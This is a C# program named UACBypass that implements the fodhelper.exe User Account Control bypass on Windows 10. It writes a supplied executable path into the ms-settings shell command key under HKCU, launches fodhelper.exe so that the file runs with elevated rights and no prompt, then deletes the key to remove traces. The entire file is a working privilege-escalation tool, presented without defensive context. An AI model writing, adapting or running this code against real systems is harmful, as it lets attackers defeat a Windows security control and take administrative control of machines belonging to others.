using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace UACBypass
{
    class Program
    {
        static void Main(string[] args)
        {
#if DEBUG
            Debug.Listeners.Add(new TextWriterTraceListener("uac.log"));
#endif

            if (Environment.OSVersion.Version.Build < 9200)
            {
                Debug.WriteLine("This program requires NT 10.0 (Windows 10) or higher!");
                return;
            }



            string fileName = args[0];
            if (!File.Exists(fileName))
            {
                Debug.WriteLine("The file {arg} specified in the argument is not valid");
                return;
            }

            Debug.WriteLine("Starting UAC bypass!");
            WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);
            if (!hasAdministrativeRight)
            {
                try
                {
                    RegistryKey rk;
                    Debug.WriteLine($"Setting value {fileName}!");
                    rk = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes\ms-settings\shell\open\command");
                    rk.SetValue("", fileName, RegistryValueKind.String);
                    rk.SetValue("DelegateExecute", "", RegistryValueKind.String);
                    Debug.WriteLine($"Executing fodhelper!");
                    Process.Start(@"C:\Windows\System32\fodhelper.exe").WaitForExit();
                    rk.Close();
                    rk = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes");
                    rk.DeleteSubKeyTree("ms-settings");
                    rk.Close();
                    Environment.Exit(0);
                }
                catch (Exception ex)
                {

                    Debug.WriteLine("An exception occured: " + ex.Message);
                    RegistryKey rk = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes");
                    rk.DeleteSubKeyTree("ms-settings");
                    rk.Close();
                    Environment.Exit(-1);
                }
            }

            Debug.WriteLine($"UAC Bypassed and ran {fileName}!");

            Thread.Sleep(1000);
            Debug.Flush();

            Environment.Exit(-1);
        }
    }
}
